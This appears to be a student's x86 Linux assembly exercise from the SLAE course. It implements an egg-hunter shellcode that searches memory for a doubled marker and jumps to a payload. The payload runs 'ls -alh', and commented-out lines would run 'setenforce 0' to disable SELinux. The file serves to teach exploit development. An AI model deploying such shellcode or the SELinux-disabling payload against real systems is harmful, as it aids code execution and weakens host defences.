 ; Student ID: SLAE – 871

global _start
section .text
_start:
page:
    or   cx,0x0fff          ; page alignment and validation, 4095
addr:
    inc  ecx                ; increase address value
 
    push 0x43               ; sigaction()
    pop  eax
    int  0x80               ; make the call
    cmp  al, 0xf2           ; test for EFAULT
    je   page               ; EFAULT, access next page
    mov  eax,0x50905090     ; Marker code to find
    mov  edi,ecx            ; edi contains address to search
    scasd                   ; look for first marker
    jnz  addr               ; no marker found, next address
    scasd                   ; first marker found look for second
    jnz  addr               ; no marker found, next address
    jmp  edi                ; found markers jump to shellcode payload
 

    nop                     ; 0x90
    push eax
    nop
    push eax
    nop    
    push eax 
    nop
    push eax
 
;    xor eax, eax
	push 0xb	; 0xb (execve) syscall-ID
        pop eax

	xor edx, edx
	push edx

	push 0x686c612d
;	push byte 0x30
	mov ecx, esp

	push edx

;	push 0x6563726f
;	push 0x666e6574
;	push 0x65732f6e
;	push 0x6962732f
;	push 0x7273752f
	
	push 0x736c2f2f
	push 0x6e69622f

	mov ebx, esp
	push edx
	push ecx
	push ebx
	mov ecx, esp

	int 0x80
